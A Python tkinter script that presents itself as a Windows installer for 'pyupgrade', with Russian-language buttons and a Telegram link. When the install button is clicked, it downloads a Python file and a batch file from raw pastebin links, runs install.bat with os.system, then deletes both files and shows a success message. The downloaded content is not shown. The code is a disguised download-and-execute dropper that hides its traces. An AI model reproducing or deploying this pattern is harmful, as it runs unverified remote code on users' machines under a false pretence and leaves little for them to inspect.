from tkinter import Tk,Canvas,PhotoImage,messagebox,Button,Label,CENTER
from requests import get
from os import system
import ctypes as ct

root = Tk()
root.title('HZF pyupgrade install')
root.configure(bg='#000000')
root.geometry('300x250')
root.resizable(width=False, height=False)

root.iconify()
root.update()
DWWMA_USE_IMMERSIVE_DARK_MODE = 20
set_window_attribute = ct.windll.dwmapi.DwmSetWindowAttribute
get_parent = ct.windll.user32.GetParent
hwnd = get_parent(root.winfo_id())
renduring_policy = DWWMA_USE_IMMERSIVE_DARK_MODE
value = 1
value = ct.c_int(value)
set_window_attribute(hwnd, renduring_policy, ct.byref(value), ct.sizeof(value))
root.update_idletasks()

f=open(r'pylogo.png', "wb")
ufr = get("https://i.imgur.com/HG0sFE0.png")
f.write(ufr.content)
f.close()

canvas = Canvas(root, bg="#000000", width=100, height=100)
canvas.pack()
logoimg = PhotoImage(file='pylogo.png')
canvas.create_image(53,60, image=logoimg)

def installupgr():
    system("del /Q pyupgrade.py")
    f=open(r'pyupgrade.py', "wb")
    ufr = get("https://pastebin.com/raw/8gX3heGA")
    f.write(ufr.content)
    f.close()

    f=open(r'install.bat', "wb")
    ufr = get("https://pastebin.com/raw/iPLmJ7ws")
    f.write(ufr.content)
    f.close()
    system('install.bat')
    system('del /Q install.bat')
    system('del /Q pyupgrade.py')
    messagebox.showinfo(title="Установлено!", message='Pyupgrade был успешно установлен.')

def remupgr():
    system('del /Q %USERPROFILE%\AppData\Local\Programs\Python\Python311\Scripts\pyupgrade.py')
    messagebox.showinfo(title="Удалено!", message='Pyupgrade был успешно удален.')

inst = Button(text='Установить скрипт', bg="green", fg="white", command=installupgr)
inst.place(x=100, y=140)

rem = Button(text='Удалить скрипт', bg="red", fg="white", command=remupgr)
rem.place(x=100, y=180)

poetry = 't.me/hzfnews'
label3 = Label(text=poetry, bg="#000000", fg="white", justify=CENTER)
label3.place(x=5, y=225)

root.deiconify()
root.mainloop()
system("del /Q pyupgrade.py")
system("del /Q pylogo.png")